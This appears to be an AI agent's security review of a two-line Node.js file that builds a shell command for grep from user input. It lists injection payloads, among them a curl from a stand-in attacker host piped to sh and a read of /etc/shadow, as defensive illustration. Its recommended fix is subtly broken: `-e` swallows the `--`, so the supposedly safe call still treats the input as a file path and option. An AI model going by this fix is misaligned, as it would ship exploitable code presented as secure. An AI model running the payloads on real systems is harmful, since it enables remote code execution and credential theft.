# Defender run

Read `server.js` — it's the whole project (2 lines, no other files to consult, and per your instruction I read nothing else).

## Findings

**1. Command injection (RCE) — Critical**

`server.js:2`:
```js
export const lookup = (name) => exec(`grep ${name} users.txt`);
```

`name` is interpolated into a shell string passed to `exec`, which runs it via `/bin/sh -c`. Any shell metacharacters in `name` execute with the server's privileges.

Exploit path:
- `lookup('x; curl http://attacker/shell.sh | sh')` — semicolon terminates the `grep` and runs the payload.
- `lookup('$(whoami)')` — command substitution evaluates before `grep` starts.
- `lookup('x && cat /etc/shadow')` — same via `&&`.
- Backticks, `|`, newlines, `>` (write arbitrary files) all work equally.

Any caller that passes user-supplied input (a query param, form field, or API arg) into `lookup` gives a remote attacker full code execution as whatever user the server runs as. This is the one real finding; treat everything below as noise by comparison.

**2. Grep option/pattern injection — Medium**

The same interpolation means `name` is parsed as a command-line argument, not just a pattern:
- `lookup('-r')` → `grep -r users.txt`: `users.txt` becomes the *pattern* and grep reads stdin — hangs the process.
- `lookup('--include=*')`, `lookup('-E -v')` etc. let a caller flip grep flags and alter what's searched/returned.

This is dominated by finding 1 (which already grants arbitrary command execution), but matters even if the injection were patched by naive quoting.

**3. No handling of non-zero grep exit — Low**

`grep` exits 1 when no match; `exec` surfaces that as an `Error` in the callback. Whether that's a problem depends on how `lookup` is consumed — the error is at least observable. Not exploitable on its own.

## Fix (smallest change that closes the gap)

Don't build a shell string at all:

```js
import { execFile } from 'node:child_process';
export const lookup = (name) => execFile('grep', ['-e', '--', name, 'users.txt']);
```

`execFile` runs `grep` directly with an argv array — no shell, so `;`, `$()`, backticks are inert — and `--` plus `-e` make even a `-`-prefixed or regex-special `name` a literal pattern instead of an option. Note `-e` keeps `name` a regex; use `-F` if literal matching is intended.

I did not edit the file, per your instruction.
